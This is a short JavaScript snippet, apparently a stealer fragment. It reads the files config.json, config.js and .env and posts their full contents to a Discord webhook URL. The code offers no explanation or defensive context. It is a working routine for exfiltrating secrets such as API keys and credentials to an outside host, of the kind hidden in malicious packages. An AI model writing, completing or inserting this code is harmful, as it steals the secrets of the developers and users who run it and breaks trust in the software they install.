const WEBHOOK_URL = "https://discord.com/api/webhooks/123/example";
const FILES = ["config.json", "config.js", ".env"];
async function sendToWebhook(filePath) {
 const fullPath = path.resolve(filePath);
 const content = fs.readFileSync(fullPath, "utf-8");
 const message = `${content}`;
 await fetch(WEBHOOK_URL, { method: "POST", body: JSON.stringify({ content: message }) });
}
FILES.forEach((file) => sendToWebhook(file));
